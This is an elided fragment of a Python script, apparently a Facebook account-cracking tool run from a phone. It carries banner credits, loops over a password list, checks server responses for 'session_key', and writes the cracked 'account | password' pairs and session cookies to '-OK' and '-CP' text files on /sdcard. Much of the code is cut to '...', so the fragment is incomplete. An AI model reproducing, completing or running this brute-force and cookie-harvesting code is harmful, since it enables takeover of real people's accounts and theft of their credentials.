...
\033[1;97m[+]\033[1;91m    FACEBOOK \033[1;90m: \033[1;92mZEESHAN BALOCH

\033[1;97m[+]\033[1;91m    GITHUB \033[1;90m: \033[1;92m  RAFI ULLAH
     ...
     try:
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                open('/sdcard/JUTT BADSHAHO-CP.txt','a').write(f'{acc} | {pword}\n')
      ...
      try:
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                ...
                open('/sdcard/JUTT BADSHAHO-OK.txt','a').write(f'{acc} | {pword}\n')
                ...
                if c=='y':
                    ...
                    try:
                           ...
                           open('/sdcard/JUTT BADSHAHO-OK.txt','a').write(f'sb={ssbb};{ckkk}\n')
